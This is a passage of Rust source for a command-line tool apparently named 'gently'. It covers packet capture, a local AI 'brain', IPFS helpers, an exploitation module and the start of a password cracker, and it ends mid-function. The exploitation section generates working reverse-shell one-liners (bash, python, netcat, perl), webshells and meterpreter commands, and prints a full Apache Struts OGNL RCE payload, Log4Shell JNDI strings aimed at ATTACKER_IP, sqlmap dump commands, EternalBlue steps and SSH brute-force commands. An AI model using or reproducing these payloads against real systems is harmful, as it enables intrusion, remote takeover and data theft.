            println!("\n  HTTP REQUEST EXTRACTION");
            println!("  =======================\n");

            match gently_network::capture::HttpExtractor::extract_requests(&file) {
                Ok(requests) => {
                    for req in requests {
                        println!("  {} {} {}{}", req.method, req.source, req.host, req.uri);
                        if let Some(ua) = req.user_agent {
                            println!("      UA: {}", &ua[..ua.len().min(50)]);
                        }
                    }
                }
                Err(e) => println!("  Error: {}", e),
            }
            Ok(())
        }

        NetworkCommands::DnsExtract { file } => {
            println!("\n  DNS QUERY EXTRACTION");
            println!("  ====================\n");

            match gently_network::capture::DnsExtractor::extract_queries(&file) {
                Ok(queries) => {
                    for q in queries {
                        println!("  {} -> {} ({})", q.source, q.query, q.query_type);
                    }
                }
                Err(e) => println!("  Error: {}", e),
            }
            Ok(())
        }

        NetworkCommands::Proxy { port, mode } => {
            println!("\n  MITM PROXY");
            println!("  ==========\n");
            println!("  Port: {}", port);
            println!("  Mode: {}", mode);
            println!();
            println!("  Configure your browser to use:");
            println!("    HTTP Proxy:  127.0.0.1:{}", port);
            println!("    HTTPS Proxy: 127.0.0.1:{}", port);
            println!();
            println!("  Note: Full proxy implementation requires async runtime.");
            println!("  Use the gently-network crate directly for programmatic access.");
            Ok(())
        }

        NetworkCommands::Repeat { request, url } => {
            println!("\n  HTTP REPEATER");
            println!("  =============\n");
            println!("  Request file: {}", request);
            if let Some(u) = &url {
                println!("  Target URL: {}", u);
            }
            println!();
            println!("  Note: Use `tokio` runtime for async HTTP replay.");
            println!("  Example: Repeater::new().send(request).await");
            Ok(())
        }

        NetworkCommands::Visualize { output } => {
            println!("\n  NETWORK VISUALIZATION");
            println!("  =====================\n");

            let viz = NetworkVisualizer::new();
            println!("{}", viz.render_ascii());

            if let Some(out) = output {
                let svg = viz.render_svg();
                std::fs::write(&out, svg)?;
                println!("\n  SVG saved to: {}", out);
            }
            Ok(())
        }

        NetworkCommands::Filters => {
            println!("\n  COMMON BPF FILTERS");
            println!("  ==================\n");
            println!("  HTTP traffic:    tcp port 80 or tcp port 443");
            println!("  DNS:             udp port 53");
            println!("  SSH:             tcp port 22");
            println!("  ICMP (ping):     icmp");
            println!("  TCP only:        tcp");
            println!("  UDP only:        udp");
            println!("  ARP:             arp");
            println!("  No broadcast:    not broadcast and not multicast");
            println!();
            println!("  DISPLAY FILTERS (Wireshark syntax):");
            println!("  HTTP requests:   http.request");
            println!("  HTTP responses:  http.response");
            println!("  TLS handshake:   tls.handshake");
            println!("  DNS queries:     dns.flags.response == 0");
            println!("  TCP SYN:         tcp.flags.syn == 1 and tcp.flags.ack == 0");
            println!("  TCP errors:      tcp.analysis.flags");
            Ok(())
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// BRAIN COMMANDS
// ═══════════════════════════════════════════════════════════════════════════

fn cmd_brain(command: BrainCommands) -> Result<()> {
    match command {
        BrainCommands::Download { model } => {
            println!("\n  MODEL DOWNLOAD");
            println!("  ==============\n");

            let downloader = ModelDownloader::new();

            match model.to_lowercase().as_str() {
                "llama-1b" | "llama" => {
                    println!("  Downloading Llama 1B...");
                    println!("  Note: Full download requires async runtime.");
                    println!("  Model URL: huggingface.co/TinyLlama/TinyLlama-1.1B-Chat-v1.0");
                }
                "embedder" | "embed" => {
                    println!("  Downloading sentence embedder...");
                    println!("  Model: all-MiniLM-L6-v2 (ONNX)");
                }
                _ => println!("  Unknown model: {}. Use: llama-1b, embedder", model),
            }
            Ok(())
        }

        BrainCommands::Embed { text } => {
            println!("\n  TEXT EMBEDDING");
            println!("  ==============\n");
            println!("  Input: {}", &text[..text.len().min(50)]);

            let embedder = Embedder::new()?;
            let embedding = embedder.embed(&text)?;

            println!("  Dimensions: {}", embedding.len());
            println!("  First 5 values: {:?}", &embedding[..5.min(embedding.len())]);
            Ok(())
        }

        BrainCommands::Infer { prompt, max_tokens } => {
            println!("\n  LOCAL INFERENCE");
            println!("  ===============\n");
            println!("  Prompt: {}", &prompt[..prompt.len().min(100)]);
            println!("  Max tokens: {}", max_tokens);
            println!();
            println!("  Note: Full inference requires GGUF model loaded.");
            println!("  Use `gently brain download --model llama-1b` first.");
            Ok(())
        }

        BrainCommands::Learn { content, category } => {
            println!("\n  TENSORCHAIN LEARN");
            println!("  =================\n");

            let mut chain = TensorChain::load_or_create("~/.gently/tensorchain.db")?;
            chain.add_memory(&content, &category)?;

            println!("  Added to TensorChain:");
            println!("  Category: {}", category);
            println!("  Content: {}...", &content[..content.len().min(80)]);
            println!("  Total memories: {}", chain.memory_count());
            Ok(())
        }

        BrainCommands::Query { query, limit } => {
            println!("\n  TENSORCHAIN QUERY");
            println!("  =================\n");

            let chain = TensorChain::load_or_create("~/.gently/tensorchain.db")?;
            let results = chain.query(&query, limit)?;

            println!("  Query: {}\n", query);
            for (i, result) in results.iter().enumerate() {
                println!("  {}. [{}] {}", i + 1, result.category, &result.content[..result.content.len().min(60)]);
            }
            Ok(())
        }

        BrainCommands::Status => {
            println!("\n  BRAIN STATUS");
            println!("  ============\n");

            println!("  MODELS:");
            println!("    Llama 1B:    Not downloaded");
            println!("    Embedder:    Simulated (use download for real ONNX)");
            println!();
            println!("  TENSORCHAIN:");
            match TensorChain::load_or_create("~/.gently/tensorchain.db") {
                Ok(chain) => println!("    Memories: {}", chain.memory_count()),
                Err(_) => println!("    Not initialized"),
            }
            Ok(())
        }

        BrainCommands::Orchestrate { ipfs, verbose } => {
            use gently_brain::{BrainOrchestrator, BrainConfig};

            println!("\n  BRAIN ORCHESTRATOR");
            println!("  ==================\n");

            let config = BrainConfig {
                enable_ipfs: ipfs,
                ..Default::default()
            };

            let orchestrator = std::sync::Arc::new(BrainOrchestrator::new(config));

            // Create runtime for async operations
            let rt = tokio::runtime::Runtime::new()?;

            rt.block_on(async {
                orchestrator.start().await.ok();

                println!("  Orchestrator started");
                println!("  IPFS sync: {}", if ipfs { "enabled" } else { "disabled" });
                println!();

                // Get initial awareness
                let snapshot = orchestrator.get_awareness_snapshot();
                println!("  AWARENESS STATE:");
                println!("    Active daemons:  {}", snapshot.active_daemons);
                println!("    Knowledge nodes: {}", snapshot.knowledge_nodes);
                println!("    Growth direction: {}", snapshot.growth_direction);
                println!();

                if verbose {
                    // Listen for events briefly
                    println!("  Listening for events (5s)...\n");
                    let events = orchestrator.events();
                    tokio::time::sleep(std::time::Duration::from_secs(5)).await;

                    if let Ok(mut rx) = events.try_lock() {
                        while let Ok(event) = rx.try_recv() {
                            println!("    Event: {:?}", event);
                        }
                    }
                }

                orchestrator.stop();
                println!("  Orchestrator stopped");
            });

            Ok(())
        }

        BrainCommands::Skills { category } => {
            use gently_brain::{SkillRegistry, SkillCategory as SC};

            println!("\n  AVAILABLE SKILLS");
            println!("  ================\n");

            let registry = SkillRegistry::new();

            let skills: Vec<_> = if let Some(cat) = category {
                let sc = match cat.to_lowercase().as_str() {
                    "crypto" => SC::Crypto,
                    "network" => SC::Network,
                    "exploit" => SC::Exploit,
                    "knowledge" => SC::Knowledge,
                    "code" => SC::Code,
                    "system" => SC::System,
                    "dance" => SC::Dance,
                    "blockchain" => SC::Blockchain,
                    "assistant" => SC::Assistant,
                    _ => {
                        println!("  Unknown category: {}", cat);
                        println!("  Valid: crypto, network, exploit, knowledge, code, system, dance, blockchain, assistant");
                        return Ok(());
                    }
                };
                registry.list_by_category(sc)
            } else {
                registry.list()
            };

            for skill in skills {
                println!("  {:20} [{:?}] {}", skill.name, skill.category, skill.description);
            }
            println!("\n  Total: {} skills", skills.len());
            Ok(())
        }

        BrainCommands::Tools { category } => {
            use gently_brain::{McpToolRegistry, ToolCategory as TC};

            println!("\n  AVAILABLE MCP TOOLS");
            println!("  ===================\n");

            let registry = McpToolRegistry::new();

            let tools: Vec<_> = if let Some(cat) = category {
                let tc = match cat.to_lowercase().as_str() {
                    "crypto" => TC::Crypto,
                    "network" => TC::Network,
                    "knowledge" => TC::Knowledge,
                    "daemon" => TC::Daemon,
                    "storage" => TC::Storage,
                    "code" => TC::Code,
                    "system" => TC::System,
                    "assistant" => TC::Assistant,
                    _ => {
                        println!("  Unknown category: {}", cat);
                        println!("  Valid: crypto, network, knowledge, daemon, storage, code, system, assistant");
                        return Ok(());
                    }
                };
                registry.list_by_category(tc)
            } else {
                registry.list()
            };

            for tool in &tools {
                let confirm = if tool.requires_confirmation { " [!]" } else { "" };
                println!("  {:25} [{:?}]{} {}", tool.name, tool.category, confirm, tool.description);
            }
            println!("\n  Total: {} tools", tools.len());
            println!("  [!] = requires confirmation");
            Ok(())
        }

        BrainCommands::Daemon { action } => {
            use gently_brain::{DaemonManager, DaemonType};

            match action {
                DaemonAction::List => {
                    println!("\n  RUNNING DAEMONS");
                    println!("  ===============\n");

                    let dm = DaemonManager::new();
                    let daemons = dm.list();

                    if daemons.is_empty() {
                        println!("  No daemons running.");
                        println!("  Use: gently brain daemon spawn <type>");
                    } else {
                        for (name, dtype, running) in daemons {
                            let status = if running { "running" } else { "stopped" };
                            println!("  {:30} [{:?}] {}", name, dtype, status);
                        }
                    }
                }

                DaemonAction::Spawn { daemon_type } => {
                    println!("\n  SPAWN DAEMON");
                    println!("  ============\n");

                    let mut dm = DaemonManager::new();
                    dm.start();

                    let dtype = match daemon_type.to_lowercase().as_str() {
                        "vector_chain" | "vector" => DaemonType::VectorChain,
                        "ipfs_sync" | "ipfs" => DaemonType::IpfsSync,
                        "git_branch" | "git" => DaemonType::GitBranch,
                        "knowledge_graph" | "knowledge" => DaemonType::KnowledgeGraph,
                        "awareness" => DaemonType::Awareness,
                        "inference" => DaemonType::Inference,
                        _ => {
                            println!("  Unknown daemon type: {}", daemon_type);
                            println!("  Valid: vector_chain, ipfs_sync, git_branch, knowledge_graph, awareness, inference");
                            return Ok(());
                        }
                    };

                    match dm.spawn(dtype) {
                        Ok(name) => println!("  Spawned: {}", name),
                        Err(e) => println!("  Error: {:?}", e),
                    }
                }

                DaemonAction::Stop { name } => {
                    println!("\n  STOP DAEMON");
                    println!("  ===========\n");
                    println!("  Stopping: {}", name);
                    println!("  (Daemon lifecycle managed by orchestrator)");
                }

                DaemonAction::Metrics { name } => {
                    println!("\n  DAEMON METRICS");
                    println!("  ==============\n");

                    let dm = DaemonManager::new();
                    match dm.status(&name) {
                        Some(status) => {
                            println!("  Daemon: {}", name);
                            println!("  Running: {}", status.running);
                            println!("  Cycles: {}", status.cycles);
                            println!("  Errors: {}", status.errors);
                            println!();
                            println!("  Metrics:");
                            println!("    Items processed: {}", status.metrics.items_processed);
                            println!("    Vectors computed: {}", status.metrics.vectors_computed);
                            println!("    Bytes synced: {}", status.metrics.bytes_synced);
                            println!("    Branches created: {}", status.metrics.branches_created);
                            println!("    Learnings added: {}", status.metrics.learnings_added);
                        }
                        None => println!("  Daemon not found: {}", name),
                    }
                }
            }
            Ok(())
        }

        BrainCommands::Knowledge { action } => {
            use gently_brain::{KnowledgeGraph, NodeType, EdgeType};

            let graph = KnowledgeGraph::new();

            match action {
                KnowledgeAction::Add { concept, context } => {
                    println!("\n  ADD KNOWLEDGE");
                    println!("  =============\n");

                    let ctx = context.unwrap_or_default();
                    graph.learn(&concept, &ctx, 0.8);
                    println!("  Added: {}", concept);
                    if !ctx.is_empty() {
                        println!("  Context: {}", ctx);
                    }
                }

                KnowledgeAction::Search { query, depth } => {
                    println!("\n  KNOWLEDGE SEARCH");
                    println!("  ================\n");
                    println!("  Query: {}\n", query);

                    let results = graph.find(&query);
                    for node in results.iter().take(10) {
                        println!("  {:20} [{:?}] conf={:.2}", node.name, node.node_type, node.confidence);
                        if depth > 0 {
                            let related = graph.related(&node.id, depth);
                            for rel in related.iter().take(3) {
                                println!("    └─ {}", rel.name);
                            }
                        }
                    }
                }

                KnowledgeAction::Infer { premise, steps } => {
                    println!("\n  KNOWLEDGE INFERENCE");
                    println!("  ===================\n");
                    println!("  Premise: {}", premise);
                    println!("  Max steps: {}\n", steps);

                    let inferences = graph.infer(&premise, steps);
                    for (i, node) in inferences.iter().enumerate() {
                        println!("  {}. {} (derived)", i + 1, node.name);
                    }
                }

                KnowledgeAction::Similar { concept, count } => {
                    println!("\n  SIMILAR CONCEPTS");
                    println!("  ================\n");
                    println!("  To: {}\n", concept);

                    let similar = graph.similar(&concept, count);
                    for (id, score) in similar {
                        println!("  {:30} similarity={:.3}", id, score);
                    }
                }

                KnowledgeAction::Export { output } => {
                    println!("\n  EXPORT KNOWLEDGE GRAPH");
                    println!("  ======================\n");

                    let json = graph.export();
                    std::fs::write(&output, json)?;
                    println!("  Exported to: {}", output);
                }

                KnowledgeAction::Stats => {
                    println!("\n  KNOWLEDGE GRAPH STATS");
                    println!("  =====================\n");

                    let nodes = graph.find("*");
                    println!("  Total nodes: {}", nodes.len());

                    // Count by type
                    let mut by_type = std::collections::HashMap::new();
                    for node in &nodes {
                        *by_type.entry(format!("{:?}", node.node_type)).or_insert(0) += 1;
                    }
                    println!();
                    for (t, count) in by_type {
                        println!("  {:15} {}", t, count);
                    }
                }
            }
            Ok(())
        }

        BrainCommands::Think { thought } => {
            use gently_brain::{BrainOrchestrator, BrainConfig};

            println!("\n  PROCESSING THOUGHT");
            println!("  ==================\n");
            println!("  Input: {}\n", thought);

            let config = BrainConfig {
                enable_daemons: false,
                ..Default::default()
            };
            let orchestrator = BrainOrchestrator::new(config);

            let rt = tokio::runtime::Runtime::new()?;
            let result = rt.block_on(orchestrator.process_thought(&thought));

            println!("  Response: {}", result.response);
            if !result.learnings.is_empty() {
                println!("\n  Learnings:");
                for l in &result.learnings {
                    println!("    - {}", l);
                }
            }
            if !result.tool_uses.is_empty() {
                println!("\n  Tool uses:");
                for t in &result.tool_uses {
                    println!("    - {}", t);
                }
            }
            Ok(())
        }

        BrainCommands::Focus { topic } => {
            use gently_brain::{BrainOrchestrator, BrainConfig};

            println!("\n  FOCUSING ATTENTION");
            println!("  ==================\n");

            let config = BrainConfig::default();
            let orchestrator = BrainOrchestrator::new(config);

            orchestrator.focus(&topic);
            let snapshot = orchestrator.get_awareness_snapshot();

            println!("  Focused on: {}", topic);
            println!("  Current attention: {:?}", snapshot.attention);
            println!("  Growth direction: {}", snapshot.growth_direction);
            Ok(())
        }

        BrainCommands::Grow { domain } => {
            use gently_brain::{BrainOrchestrator, BrainConfig};

            println!("\n  TRIGGERING GROWTH");
            println!("  =================\n");
            println!("  Domain: {}\n", domain);

            let config = BrainConfig {
                enable_daemons: false,
                ..Default::default()
            };
            let orchestrator = BrainOrchestrator::new(config);

            let rt = tokio::runtime::Runtime::new()?;
            let nodes_added = rt.block_on(orchestrator.grow(&domain));

            println!("  Growth cycle complete");
            println!("  Nodes added: {}", nodes_added);
            println!("  New growth direction: {}", domain);
            Ok(())
        }

        BrainCommands::Awareness => {
            use gently_brain::{BrainOrchestrator, BrainConfig};

            println!("\n  AWARENESS STATE");
            println!("  ===============\n");

            let config = BrainConfig::default();
            let orchestrator = BrainOrchestrator::new(config);
            let snapshot = orchestrator.get_awareness_snapshot();

            println!("  Attention:        {:?}", snapshot.attention);
            println!("  Recent context:   {} items", snapshot.context.len());
            println!("  Active thoughts:  {}", snapshot.active_thoughts);
            println!("  Knowledge nodes:  {}", snapshot.knowledge_nodes);
            println!("  Active daemons:   {}", snapshot.active_daemons);
            println!("  Growth direction: {}", snapshot.growth_direction);

            if !snapshot.context.is_empty() {
                println!("\n  Recent context:");
                for ctx in snapshot.context.iter().take(5) {
                    println!("    - {}", ctx);
                }
            }
            Ok(())
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// ARCHITECT COMMANDS
// ═══════════════════════════════════════════════════════════════════════════

fn cmd_architect(command: ArchitectCommands) -> Result<()> {
    match command {
        ArchitectCommands::Idea { content, project } => {
            println!("\n  NEW IDEA");
            println!("  ========\n");

            let crystal = IdeaCrystal::new(&content, project.as_deref());

            println!("  ID: {}", crystal.id());
            println!("  State: {:?}", crystal.state());
            println!("  Content: {}", content);
            if let Some(p) = project {
                println!("  Project: {}", p);
            }
            println!();
            println!("  Use `gently architect confirm {}` to embed", crystal.id());
            Ok(())
        }

        ArchitectCommands::Confirm { id } => {
            println!("\n  CONFIRM IDEA");
            println!("  ============\n");
            println!("  ID: {}", id);
            println!("  Status: Embedding idea...");
            println!("  (In production, this embeds and transitions to Confirmed state)");
            Ok(())
        }

        ArchitectCommands::Crystallize { id } => {
            println!("\n  CRYSTALLIZE IDEA");
            println!("  ================\n");
            println!("  ID: {}", id);
            println!("  Status: Crystallizing...");
            println!("  (In production, this finalizes the idea as immutable)");
            Ok(())
        }

        ArchitectCommands::Flow { name, format } => {
            println!("\n  FLOWCHART: {}", name);
            println!("  {}\n", "=".repeat(name.len() + 12));

            let flow = FlowChart::new(&name);

            match format.as_str() {
                "ascii" => println!("{}", flow.render_ascii()),
                "svg" => println!("{}", flow.render_svg()),
                _ => println!("Unknown format: {}. Use: ascii, svg", format),
            }
            Ok(())
        }

        ArchitectCommands::Node { flow, label, kind } => {
            println!("\n  ADD NODE");
            println!("  ========\n");
            println!("  Flow: {}", flow);
            println!("  Label: {}", label);
            println!("  Type: {}", kind);
            println!("  (Node added to flowchart)");
            Ok(())
        }

        ArchitectCommands::Edge { flow, from, to, label } => {
            println!("\n  ADD EDGE");
            println!("  ========\n");
            println!("  Flow: {}", flow);
            println!("  {} -> {}", from, to);
            if let Some(l) = label {
                println!("  Label: {}", l);
            }
            Ok(())
        }

        ArchitectCommands::Tree { path } => {
            println!("\n  PROJECT TREE");
            println!("  ============\n");

            let tree = ProjectTree::from_path(&path)?;
            println!("{}", tree.render_ascii());
            Ok(())
        }

        ArchitectCommands::Recall { query } => {
            println!("\n  RECALL ENGINE");
            println!("  =============\n");
            println!("  Query: {}", query);
            println!();
            println!("  (RecallEngine queries session history without scroll)");
            println!("  (In production, this searches embedded conversation)");
            Ok(())
        }

        ArchitectCommands::Export { output } => {
            println!("\n  EXPORT SESSION");
            println!("  ==============\n");

            if let Some(out) = output {
                println!("  Exporting to: {}", out);
                println!("  (Session exported with XOR lock)");
            } else {
                println!("  (Use --output to specify file)");
            }
            Ok(())
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// IPFS COMMANDS
// ═══════════════════════════════════════════════════════════════════════════

fn cmd_ipfs(command: IpfsCommands) -> Result<()> {
    match command {
        IpfsCommands::Add { file, pin } => {
            println!("\n  IPFS ADD");
            println!("  ========\n");
            println!("  File: {}", file);
            println!("  Pin: {}", pin);
            println!();
            println!("  Note: Requires IPFS daemon running.");
            println!("  Use: ipfs daemon &");
            Ok(())
        }

        IpfsCommands::Get { cid, output } => {
            println!("\n  IPFS GET");
            println!("  ========\n");
            println!("  CID: {}", cid);
            if let Some(out) = output {
                println!("  Output: {}", out);
            }
            Ok(())
        }

        IpfsCommands::Pin { cid, remote } => {
            println!("\n  IPFS PIN");
            println!("  ========\n");
            println!("  CID: {}", cid);
            if let Some(r) = remote {
                println!("  Remote service: {}", r);
            } else {
                println!("  Local pin");
            }
            Ok(())
        }

        IpfsCommands::Pins => {
            println!("\n  PINNED CONTENT");
            println!("  ==============\n");
            println!("  (Requires IPFS daemon)");
            println!("  Use: ipfs pin ls");
            Ok(())
        }

        IpfsCommands::StoreThought { content, tags } => {
            println!("\n  STORE THOUGHT TO IPFS");
            println!("  =====================\n");
            println!("  Content: {}...", &content[..content.len().min(60)]);
            if let Some(t) = tags {
                println!("  Tags: {}", t);
            }
            println!();
            println!("  (In production, this stores thought JSON to IPFS)");
            println!("  They spend, we gather.");
            Ok(())
        }

        IpfsCommands::GetThought { cid } => {
            println!("\n  GET THOUGHT FROM IPFS");
            println!("  =====================\n");
            println!("  CID: {}", cid);
            println!();
            println!("  (Retrieves thought from IPFS and hydrates)");
            Ok(())
        }

        IpfsCommands::Status => {
            println!("\n  IPFS STATUS");
            println!("  ===========\n");
            println!("  Daemon: Checking...");
            println!();
            println!("  Run `ipfs id` to check your node.");
            println!("  Philosophy: They call interface and API...");
            println!("              They spend, we gather.");
            Ok(())
        }
    }
}

// ============================================================================
// SPLOIT COMMANDS - Exploitation framework for authorized testing
// ============================================================================

fn cmd_sploit(command: SploitCommands) -> Result<()> {
    use gently_sploit::payloads::{ShellPayload, OperatingSystem};

    match command {
        SploitCommands::Console => {
            println!("{}", banner());
            println!("\n  INTERACTIVE CONSOLE");
            println!("  ===================\n");
            println!("  Type 'help' for commands, 'exit' to quit.\n");

            let mut console = SploitConsole::new();
            println!("{}", console.prompt());

            // In a real implementation, this would be an interactive loop
            println!("  [*] Console ready. Use 'search', 'use', 'exploit'...");
            println!("  [*] WARNING: For authorized penetration testing only.");
            Ok(())
        }

        SploitCommands::Search { query } => {
            println!("\n  MODULE SEARCH: {}", query);
            println!("  ================={}\n", "=".repeat(query.len()));

            let framework = Framework::new();
            let results = framework.modules.search(&query);

            if results.is_empty() {
                println!("  No modules found matching '{}'", query);
            } else {
                for module in results {
                    println!("  {}", module);
                }
            }
            Ok(())
        }

        SploitCommands::Payload { payload_type, lhost, lport, os } => {
            println!("\n  PAYLOAD GENERATOR");
            println!("  =================\n");

            let host = lhost.unwrap_or_else(|| "0.0.0.0".to_string());

            let os_type = match os.to_lowercase().as_str() {
                "windows" | "win" => OperatingSystem::Windows,
                "macos" | "mac" | "osx" => OperatingSystem::MacOS,
                _ => OperatingSystem::Linux,
            };

            let payload = match payload_type.as_str() {
                "reverse_bash" => ShellPayload::linux_reverse(&host, lport),
                "reverse_python" => {
                    format!(
                        "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                        host, lport
                    )
                }
                "reverse_nc" => format!("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f", host, lport),
                "reverse_perl" => {
                    format!(
                        "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
                        host, lport
                    )
                }
                "webshell_php" => ShellPayload::webshell_php().to_string(),
                "webshell_asp" => ShellPayload::webshell_asp().to_string(),
                "webshell_jsp" => ShellPayload::webshell_jsp().to_string(),
                "meterpreter" => {
                    format!("msfvenom -p {}/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe",
                        match os_type { OperatingSystem::Windows => "windows", _ => "linux/x86" },
                        host, lport
                    )
                }
                _ => ShellPayload::reverse_shell(os_type, &host, lport),
            };

            println!("  Type:   {}", payload_type);
            println!("  OS:     {:?}", os_type);
            println!("  LHOST:  {}", host);
            println!("  LPORT:  {}", lport);
            println!();
            println!("  PAYLOAD:");
            println!("  --------");
            println!("{}", payload);
            println!();
            println!("  [*] Start listener with: nc -lvnp {}", lport);
            Ok(())
        }

        SploitCommands::Listener { port } => {
            println!("\n  LISTENER COMMANDS");
            println!("  =================\n");
            println!("  Netcat listener:");
            println!("    nc -lvnp {}", port);
            println!();
            println!("  Socat listener:");
            println!("    socat TCP-LISTEN:{},reuseaddr,fork EXEC:/bin/bash", port);
            println!();
            println!("  Python listener:");
            println!("    python3 -c \"import socket,subprocess;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',{}));s.listen(1);c,a=s.accept();print(f'Connected from {{a}}');exec(\\\"import os;os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(['/bin/bash','-i'])\\\")\"", port);
            println!();
            println!("  [*] Waiting for connections on port {}...", port);
            Ok(())
        }

        SploitCommands::Scan { target, scan_type } => {
            println!("\n  SCANNING: {}", target);
            println!("  =========={}\n", "=".repeat(target.len()));

            match scan_type.as_str() {
                "port" => {
                    println!("  [*] Port scan (use nmap for real scans):");
                    println!("    nmap -sV -sC {}", target);
                    println!("    nmap -p- -T4 {}", target);
                    println!();
                    println!("  Common ports:");
                    println!("    21/ftp  22/ssh  23/telnet  25/smtp  53/dns");
                    println!("    80/http  110/pop3  143/imap  443/https  445/smb");
                    println!("    3306/mysql  3389/rdp  5432/postgresql  8080/http-alt");
                }
                "service" => {
                    println!("  [*] Service enumeration:");
                    println!("    nmap -sV -sC -O {}", target);
                    println!("    whatweb {}", target);
                    println!("    nikto -h {}", target);
                }
                "vuln" => {
                    println!("  [*] Vulnerability scan:");
                    println!("    nmap --script vuln {}", target);
                    println!("    nuclei -u {}", target);
                    println!("    nikto -h {}", target);
                }
                _ => {
                    println!("  Unknown scan type. Use: port, service, vuln");
                }
            }
            Ok(())
        }

        SploitCommands::Exploit { module, target } => {
            println!("\n  EXPLOIT MODULE: {}", module);
            println!("  ================={}\n", "=".repeat(module.len()));

            let target_str = target.unwrap_or_else(|| "<target>".to_string());

            match module.as_str() {
                "http/struts_rce" | "struts" => {
                    println!("  Apache Struts RCE (CVE-2017-5638)");
                    println!();
                    println!("  curl -H \"Content-Type: %{{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{{'cmd','/c',#cmd}}:{{'/bin/sh','-c',#cmd}})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}}\" {}", target_str);
                }
                "http/log4shell" | "log4j" => {
                    println!("  Log4Shell (CVE-2021-44228)");
                    println!();
                    println!("  Payload: ${{jndi:ldap://ATTACKER_IP:1389/a}}");
                    println!();
                    println!("  1. Start LDAP server: java -jar JNDIExploit.jar -i ATTACKER_IP");
                    println!("  2. Inject payload in headers:");
                    println!("     curl -H \"X-Api-Version: ${{jndi:ldap://ATTACKER_IP:1389/Basic/Command/Base64/COMMAND}}\" {}", target_str);
                }
                "http/sqli" | "sqli" => {
                    println!("  SQL Injection");
                    println!();
                    println!("  sqlmap -u \"{}/page?id=1\" --dbs", target_str);
                    println!("  sqlmap -u \"{}/page?id=1\" --tables -D database", target_str);
                    println!("  sqlmap -u \"{}/page?id=1\" --dump -D database -T users", target_str);
                }
                "smb/eternalblue" | "ms17-010" => {
                    println!("  EternalBlue (MS17-010)");
                    println!();
                    println!("  Check: nmap -p 445 --script smb-vuln-ms17-010 {}", target_str);
                    println!();
                    println!("  msfconsole:");
                    println!("    use exploit/windows/smb/ms17_010_eternalblue");
                    println!("    set RHOSTS {}", target_str);
                    println!("    set PAYLOAD windows/x64/meterpreter/reverse_tcp");
                    println!("    exploit");
                }
                "ssh/bruteforce" | "ssh" => {
                    println!("  SSH Bruteforce");
                    println!();
                    println!("  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{}", target_str);
                    println!("  medusa -h {} -u root -P wordlist.txt -M ssh", target_str);
                }
                _ => {
                    println!("  Module '{}' not found.", module);
                    println!();
                    println!("  Available modules:");
                    println!("    http/struts_rce   - Apache Struts RCE");
                    println!("    http/log4shell    - Log4j RCE");
                    println!("    http/sqli         - SQL Injection");
                    println!("    smb/eternalblue   - MS17-010");
                    println!("    ssh/bruteforce    - SSH password attack");
                }
            }
            Ok(())
        }

        SploitCommands::List { category } => {
            println!("\n  EXPLOIT MODULES");
            println!("  ===============\n");

            let modules = vec![
                ("exploit/http/struts_rce", "Apache Struts OGNL RCE (CVE-2017-5638)"),
                ("exploit/http/log4shell", "Log4j JNDI RCE (CVE-2021-44228)"),
                ("exploit/http/sqli", "SQL Injection attacks"),
                ("exploit/http/xss", "Cross-site scripting"),
                ("exploit/ssh/bruteforce", "SSH password bruteforce"),
                ("exploit/smb/eternalblue", "MS17-010 EternalBlue"),
                ("exploit/local/linux_privesc", "Linux privilege escalation"),
                ("auxiliary/scanner/port", "Port scanner"),
                ("auxiliary/scanner/http", "HTTP scanner"),
                ("auxiliary/gather/dns", "DNS enumeration"),
                ("auxiliary/fuzz/http", "HTTP fuzzer"),
                ("post/linux/enum", "Linux enumeration"),
                ("post/windows/enum", "Windows enumeration"),
            ];

            let cat = category.unwrap_or_default();
            for (name, desc) in modules {
                if cat.is_empty() || name.contains(&cat) {
                    println!("  {}  - {}", name, desc);
                }
            }

            println!();
            println!("  Use: gently sploit exploit <module> -t <target>");
            Ok(())
        }
    }
}

// ============================================================================
// CRACK COMMANDS - Password cracking tools
// ============================================================================

fn cmd_crack(command: CrackCommands) -> Result<()> {
    use gently_cipher::cracker::{HashType, Rule};

    match command {
        CrackCommands::Dictionary { hash, wordlist, hash_type, rules } => {
            println!("\n  DICTIONARY ATTACK");
            println!("  =================\n");
            println!("  Hash:      {}", hash);
            println!("  Type:      {}", hash_type);
            println!("  Wordlist:  {}", wordlist.as_deref().unwrap_or("default"));
            println!("  Rules:     {}", if rules { "enabled" } else { "disabled" });
            println!();

            // Detect hash type
            let ht = match hash_type.to_lowercase().as_str() {
                "md5" => Some(HashType::MD5),
                "sha1" => Some(HashType::SHA1),
                "sha256" => Some(HashType::SHA256),
                "ntlm" => Some(HashType::NTLM),
                _ => None, // auto-detect
            };

            // Create cracker
            let mut cracker = if let Some(wl_path) = &wordlist {
                if rules {
                    Cracker::new().wordlist(wl_path).default_rules()
                } else {
